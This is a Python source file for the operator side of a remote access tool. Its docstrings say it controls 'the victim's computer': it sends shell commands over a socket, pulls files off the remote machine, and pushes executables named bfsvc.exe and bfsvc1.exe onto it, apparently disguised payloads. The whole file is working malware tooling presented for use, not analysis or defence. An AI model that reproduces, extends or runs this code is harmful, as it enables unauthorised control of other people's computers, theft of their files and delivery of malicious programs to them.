import os, sys, socket, base64

from optparse import OptionParser
from termcolor import colored

class Client:
    def __init__(self, ip: str, port: int) -> None:
        """
            Initialization function
        """
        try:
            self.downloadDirectory = f'{os.getcwd()}/Downloads'
            self.current_path = os.getcwd()
            self.current_files = os.listdir(os.getcwd())
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((ip, port))
        except Exception as exc:
            print('Exception __init__(): ', exc)
    def command_ls(self) -> bool:
        """
            Current files in a directory on my PC
        """
        try:
            result = []
            for file in self.current_files:
                if os.path.isfile(file):
                    result.append(f"\t{file} -- File \n")
                elif os.path.isdir(file):
                    result.append(f"\t{file} -- Directory \n")
                else:
                    continue
            mystr = "".join(result)
            if mystr:
                CURRENT_PATH = f"\n\nCurrent Files:\n{mystr}\nPath: {self.current_path}"
            else:
                CURRENT_PATH = "\n\n\t--- Directory is empty ---"
            print(CURRENT_PATH)
            return True
        except Exception as exc:
            print('Exception command_ls(): ', exc)
    def command_upload(self, command: str) -> bool:
        """
            Command to download a file to the victim's computer
        """
        try:
            filename = command.split()[1]
            with open(filename, 'rb') as file_to_send:
                file = file_to_send.read()
                self.socket.send(base64.b64encode(file))
                file_to_send.close()
            self.socket.send(b"--- File upload was successful ---")
            result_output = self.socket.recv(1024).decode()
            print(result_output)
            return True
        except Exception as exc:
            print('Exception command_upload(): ', exc)
    def command_get(self, command: str, data: str) -> None:
        """
            Command to download a file from the victim's computer
        """
        try:
            filename = command.split()[1]
            json_data = f"{data}"
            while True:
                try:
                    data = self.socket.recv(1024).decode("utf-8", "ignore")
                    json_data = json_data + data
                    
                    if "File upload was successful" in data:
                        with open(f'{self.downloadDirectory}/{filename}', 'wb') as file:
                            file.write(base64.b64decode(json_data.replace("--- File upload was successful ---", "")))
                            file.close()
                        print('File Download Successfully')
                        break
                except Exception:
                    continue
        except Exception as exc:
            print('Exception command_get(): ', exc)
    def command_dir(self) -> None:
        """
            Command watch files and directories in the directory
        """
        try:
            json_data = ""
            while True:
                try:
                    data = base64.b64decode(self.socket.recv(1024)).decode("utf-8", "ignore")
                    json_data = json_data + data
                    if "--- End ---" in data:
                        print(json_data.replace('--- End ---', ''))
                        break
                except Exception:
                    continue
        except Exception as exc:
            print('Exception command_dir(): ', exc)
    def run(self) -> None:
        try: 
            while 1:  
                command = str(input('>> '))
                if command.lower() == 'ls':
                    result_command = self.command_ls()
                    if result_command:
                        continue
                elif command.lower() == 'upload bfsvc.exe':
                    result_command = self.command_upload(command)
                    if result_command:
                        continue
                elif command.lower() == 'upload bfsvc1.exe':
                    result_command = self.command_upload(command)
                    if result_command:
                        continue
                elif command.lower() == 'exit':
                    self.socket.send(command.encode())
                    self.socket.close()
                    break
                elif command.lower() == 'clear':
                    os.system('clear')
                    continue
                elif command.lower() == 'dir':
                    self.socket.send(command.encode())
                    self.command_dir()
                elif 'get' in command:
                    self.socket.send(command.encode())
                    result_output = self.socket.recv(1024).decode()
                    if 'File not found' in result_output:
                        print('result_output: ', result_output)
                    else:
                        self.command_get(command, result_output)
                elif 'run' in command:
                    self.socket.send(command.encode())
                    result_output = base64.b64decode(self.socket.recv(1024)).decode()
                    print('result_output: ', f"\n\n{result_output}")
                elif not len(command):
                    continue
                else:
                    self.socket.send(command.encode())
                    result_output = base64.b64decode(self.socket.recv(1024)).decode()
                    print('result_output: ', result_output)
                    continue
        except KeyboardInterrupt:
            self.socket.send(b'exit')
            self.socket.close()

def arg_func():
    """
        Arguments from command string
    """
    try:
        parser = OptionParser()
        parser.add_option("-i", "--ip", dest="ip", help="Enter listening ip-address")
        parser.add_option("-p", "--port", dest="port", help="Enter listening port")
        options, _ = parser.parse_args()
        if not options.ip:
            parser.error(colored("Enter listening ip-address -i or --ip", "yellow", attrs=['bold']))
            sys.exit()
        elif not options.port:
            parser.error(colored("Enter listening port -p or --port", "yellow", attrs=['bold']))
            sys.exit()
        else:
            return str(options.ip), int(options.port)
    except Exception:
        print(colored('[-] An error occurred while adding arguments', 'red', attrs=['bold']))

if __name__ == '__main__':
    ip, port = arg_func()
    client = Client(ip, port)
    client.run()
